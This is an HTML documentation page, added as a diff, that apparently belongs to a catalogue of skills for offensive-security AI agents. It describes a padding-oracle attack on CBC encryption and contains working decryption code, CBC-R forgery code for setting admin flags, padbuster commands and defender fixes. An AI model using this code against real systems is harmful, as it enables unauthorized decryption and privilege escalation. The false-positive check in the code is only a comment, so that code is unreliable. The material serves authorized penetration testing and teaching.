@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: padding-oracle</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>padding-oracle</h2><div class="meta"><span class="badge gray">crypto</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when you encounter CBC-mode ciphertext with distinguishable</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="crypto-fundamentals.html">crypto-fundamentals</a> <a href="rsa-attacks.html">rsa-attacks</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Python</td><td>3.12</td></tr><tr><td>OpenSSL</td><td>3.3.x</td></tr><tr><td>CyberChef</td><td>10.x</td></tr><tr><td>Burp Suite</td><td>2026.2</td></tr></tbody></table><p>A padding oracle is any behavior that tells you whether decrypted CBC ciphertext had valid PKCS#7 padding: a different error message, a timing difference, or a redirect versus a 500 page. Each oracle answer leaks one bit of information about the plaintext, and enough answers decrypt the whole message, then forge new ones, without ever learning the key. This skill covers the authorized workflow for finding and exploiting padding oracles: recognizing the oracle, decrypting byte by byte, encrypting chosen plaintexts, and recommending the fix. All work targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm CBC mode and locate the ciphertext: cookies, tokens, URL</li>
+<p>parameters, or hidden form fields.</p>
+<li>Prove the oracle: flip bytes in the ciphertext and find a</li>
+<p>distinguishable valid versus invalid padding response.</p>
+<li>Decrypt the target ciphertext byte by byte from the last block</li>
+<p>backward, using the oracle as the guide.</p>
+<li>Verify the decryption by checking for readable structure.</li>
+<li>Forge new ciphertexts (CBC-R technique) for chosen plaintexts when</li>
+<p>the test calls for it.</p>
+<li>Automate with tooling once the manual flow works, and rate-limit</li>
+<p>yourself to stay inside the agreed test window.</p>
+<li>Report the oracle location, the decrypted sample, and the fix.</li>
+</ol>
+<h2>1. Recognize the target</h2>
+<p>CBC ciphertext with padding oracles usually appears as:</p>
+<ul>
+<li>An encrypted cookie or token (base64 or hex, length a multiple of 16</li>
+<p>bytes for AES).</p>
+<li>A <code>?data=</code> URL parameter carrying encrypted state.</li>
+<li>Encrypted viewstate or session blobs in form fields.</li>
+</ul>
+<pre><code class="language-bash"># Triage a suspicious token: decode and check block alignment
+python3 &lt;&lt;&#x27;EOF&#x27;
+import base64
+tok = &quot;PASTE_TOKEN_HERE&quot;
+raw = base64.b64decode(tok)
+print(&quot;bytes:&quot;, len(raw), &quot;blocks:&quot;, len(raw) / 16)
+print(&quot;block-aligned:&quot;, len(raw) % 16 == 0)
+EOF</code></pre>
+<p>Block-aligned ciphertext that changes server behavior when you tamper with it is the starting signal. Confirm AES-CBC from documentation, client code (see the mobile and web skills), or the error messages themselves.</p>
+<h2>2. Prove the oracle</h2>
+<p>Flip bytes in the last block&#x27;s preceding block (the IV for block 1, or ciphertext block N-1 for block N) and watch the server&#x27;s response. Valid padding after your flip is rare; invalid padding is the norm, so the two responses differ.</p>
+<pre><code class="language-bash"># Capture a baseline request in Burp, then tamper the token
+# Example with curl: flip the last byte of the second-to-last block
+python3 &lt;&lt;&#x27;EOF&#x27;
+import base64
+tok = base64.b64decode(&quot;PASTE_TOKEN_HERE&quot;)
+lst = bytearray(tok)
+lst[-17] ^= 0x01   # flip one bit in the block before the last
+print(base64.b64encode(bytes(lst)).decode())
+EOF</code></pre>
+<p>Send the tampered token and record the response. Then send the original untampered token. An oracle exists if you can distinguish the two:</p>
+<ul>
+<li>Different HTTP status codes (200 vs 500).</li>
+<li>Different error text (&quot;invalid padding&quot; vs &quot;decryption failed&quot; vs a</li>
+<p>redirect).</p>
+<li>Different response times (padding check fails fast, MAC check fails</li>
+<p>slow, or vice versa).</p>
+<li>Different page content (logged-in page vs login page).</li>
+</ul>
+<p>No distinguishable difference means no usable oracle through that channel. Try other tamper positions and other response aspects before concluding.</p>
+<h2>3. Decrypt byte by byte</h2>
+<p>The core loop: to decrypt the last byte of a block, modify the corresponding byte of the previous block through all 256 values until the oracle says padding is valid. Valid padding <code>0x01</code> means your modified byte XOR the intermediate value equals 1, which reveals the intermediate byte, and plaintext = intermediate XOR original byte.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;Padding oracle decryption. Fill in the oracle() function for the target.&quot;&quot;&quot;
+import base64, urllib.request
+
+BLOCK = 16
+
+def oracle(ciphertext: bytes) -&gt; bool:
+    &quot;&quot;&quot;Return True when the server says padding is VALID.&quot;&quot;&quot;
+    tok = base64.b64encode(ciphertext).decode()
+    url = &quot;https://target.example/check?token=&quot; + tok
+    with urllib.request.urlopen(url, timeout=10) as r:
+        body = r.read()
+    # Adapt: True means valid padding on THIS target
+    return b&quot;welcome&quot; in body.lower()
+
+def decrypt_block(prev: bytes, block: bytes) -&gt; bytes:
+    intermediate = bytearray(BLOCK)
+    plain = bytearray(BLOCK)
+    crafted = bytearray(prev)
+    for pad_len in range(1, BLOCK + 1):
+        # fix already-known tail bytes to produce valid padding
+        for i in range(1, pad_len):
+            crafted[BLOCK - i] = intermediate[BLOCK - i] ^ pad_len
+        for guess in range(256):
+            crafted[BLOCK - pad_len] = guess
+            if oracle(bytes(crafted) + block):
+                # avoid the false positive where original padding was valid:
+                # flip one more bit and require the oracle to flip too
+                intermediate[BLOCK - pad_len] = guess ^ pad_len
+                break
+        plain[BLOCK - pad_len] = intermediate[BLOCK - pad_len] ^ prev[BLOCK - pad_len]
+        print(f&quot;[*] byte {BLOCK-pad_len}: {plain[BLOCK-pad_len]:#04x}&quot;)
+    return bytes(plain)
+
+raw = base64.b64decode(&quot;PASTE_TOKEN_HERE&quot;)
+blocks = [raw[i:i+BLOCK] for i in range(0, len(raw), BLOCK)]
+# First &quot;previous block&quot; is the IV; handle per target (often prepended)
+plaintext = b&quot;&quot;
+for i in range(len(blocks) - 1, 0, -1):
+    plaintext = decrypt_block(blocks[i-1], blocks[i]) + plaintext
+print(&quot;plaintext:&quot;, plaintext)</code></pre>
+<p>Notes for real targets:</p>
+<ul>
+<li>The false-positive problem: when the original ciphertext already</li>
+<p>has valid padding, your first guess may &quot;succeed&quot; without changing anything. Detect it by flipping an adjacent byte and confirming the oracle response changes.</p>
+<li>Rate limiting: 256 requests per byte, 16 bytes per block. A 3-block</li>
+<p>token needs roughly 12k requests. Add small delays and stay inside the agreed test window; tell the client this is request-heavy.</p>
+<li>The IV: if the token format prepends the IV, block 0 decrypts with</li>
+<p>it. If not, the first block may use a fixed IV you cannot recover without the key; later blocks still decrypt fully.</p>
+</ul>
+<h2>4. Verify the decryption</h2>
+<p>Decrypted bytes should show structure: JSON, serialized session data, or readable text with PKCS#7 padding at the end (last byte n means n bytes of value n).</p>
+<pre><code class="language-bash"># Inspect padding validity of your recovered plaintext
+python3 &lt;&lt;&#x27;EOF&#x27;
+pt = b&#x27;RECOVERED_BYTES_HERE&#x27;
+pad = pt[-1]
+print(&quot;pad value:&quot;, pad, &quot;valid:&quot;, pt.endswith(bytes([pad]) * pad))
+print(pt[:-pad])
+EOF</code></pre>
+<h2>5. Forge ciphertexts (CBC-R)</h2>
+<p>Once you can decrypt, you can encrypt arbitrary plaintexts without the key. To produce a ciphertext block C&#x27; that decrypts to chosen plaintext P&#x27; under unknown IV handling, use the intermediate values from decryption: C&#x27;[i] = intermediate[i] XOR P&#x27;[i], then prepend any valid previous block.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;CBC-R: forge a block decrypting to chosen plaintext.&quot;&quot;&quot;
+BLOCK = 16
+
+def forge_block(intermediate: bytes, want: bytes) -&gt; bytes:
+    return bytes(a ^ b for a, b in zip(intermediate, want))
+
+# intermediate from the decryption step for the target block position
+# forged = forge_block(intermediate, b&#x27;admin=true;      &#x27;)
+# Send forged as the last block with the original preceding block</code></pre>
+<p>Practical forging usually targets the last block: set <code>role=admin</code> style flags, or flip a boolean in session data. You need the intermediate bytes for the block you forge, which the decryption step already gave you.</p>
+<h2>6. Tooling</h2>
+<pre><code class="language-bash"># padbuster: classic automated padding oracle exploitation
+# Usage pattern against a URL carrying the ciphertext:
+padbuster &quot;https://target.example/check?token=BASE64_TOKEN&quot; \
+  &quot;BASE64_TOKEN&quot; 16 -cookies &quot;session=abc&quot; -error &quot;Invalid padding&quot;
+
+# Key flags: -plaintext for chosen-plaintext forging, -encoded for URL encoding</code></pre>
+<p>Route tooling through Burp to inspect and throttle:</p>
+<pre><code class="language-bash"># Python oracle via Burp proxy for visibility
+# In oracle(): use http.client with proxy 127.0.0.1:8080, or set
+# environment https_proxy=http://127.0.0.1:8080 for urllib</code></pre>
+<p>CyberChef helps analyze recovered plaintext (detect encodings, parse structures) and OpenSSL verifies your understanding of the mode:</p>
+<pre><code class="language-bash"># Decrypt locally once you suspect you know the key/IV (sanity check)
+openssl enc -d -aes-128-cbc -in cipher.bin -out plain.bin \
+  -K &lt;hexkey&gt; -iv &lt;hexiv&gt;</code></pre>
+<h2>Edge cases</h2>
+<ul>
+<li>The oracle is timing-based, not message-based. Measure over many</li>
+<p>samples, use a local network or account for jitter, and set the decision threshold from the baseline distribution, not from one pair of requests.</p>
+<li>Valid and invalid responses differ only after authentication. Your</li>
+<p>oracle function must hold a valid session; re-login when it expires or every decrypt byte misleads you.</p>
+<li>The application uses encrypt-then-MAC correctly. Then tampering</li>
+<p>fails closed with no padding signal, which is the secure design; document it as effective and move on.</p>
+<li>The block cipher is not AES (3DES, Blowfish have 8-byte blocks).</li>
+<p>Set BLOCK = 8 and the same math applies.</p>
+<li>The padding is not PKCS#7 (zero padding, ANSI X.923). The oracle</li>
+<p>loop adapts: valid padding has a different shape, but the byte-at-a-time strategy is identical.</p>
+<li>Request limits or WAF blocks halt the attack mid-decryption. Slow</li>
+<p>down, rotate politely within the rules, or ask the client for a test window without rate limiting.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Byte-by-byte is too slow for a large blob: decrypt only the blocks</li>
+<p>you need (session flags usually live in one block), not the whole token.</p>
+<li>The oracle is weak (only one bit of signal per request): the</li>
+<p>attack still works, it just needs more requests. Budget accordingly and confirm the test window covers it.</p>
+<li>You need encryption, not just decryption, and CBC-R feels fragile:</li>
+<p>validate each forged block with the oracle before using it; a forged block with bad padding fails closed and tells you so.</p>
+<li>The target is not CBC but ECB: cut-and-paste replaces oracles</li>
+<p>entirely (reorder blocks to promote privileges), which is simpler; see crypto-fundamentals.</p>
+<li>The protocol is RSA PKCS#1 v1.5 with a decryption oracle: that is</li>
+<p>Bleichenbacher, a different oracle family with its own workflow; do not force the CBC tooling onto it.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see padding oracle attacks as thousands of similar requests with slightly mutated tokens from one source, a classic WAF and rate limit trigger. The durable fix is encrypt-then-MAC (or an AEAD mode like AES-GCM): verify the MAC before decrypting, and return a single generic error for any failure so no padding signal leaks. Never branch on padding validity in observable behavior, including timing. For code review, flag every <code>decrypt</code> call whose errors propagate distinctly, and every place CBC is used without a MAC. TLS 1.3 removed CBC cipher suites for exactly this history of oracle attacks.</p>
+<h2>Key references</h2>
+<ul>
+<li>CWE-327 (Use of a Broken or Risky Cryptographic Algorithm): CBC</li>
+<p>without integrity.</p>
+<li>CWE-696 (Incorrect Behavior Order): MAC checked after decryption</li>
+<p>instead of before.</p>
+<li>CWE-203 (Observable Discrepancy): the oracle itself.</li>
+<li>MITRE ATT&amp;CK T1552 (Unsecured Credentials): when decrypted tokens</li>
+<p>yield credentials.</p>
+<li>Serge Vaudenay, &quot;Security Flaws Induced by CBC Padding&quot; (EUROCRYPT</li>
+<p>2002): the original padding oracle paper.</p>
+<li>OpenSSL documentation: https://docs.openssl.org/</li>
+<li>CyberChef: https://gchq.github.io/CyberChef/</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
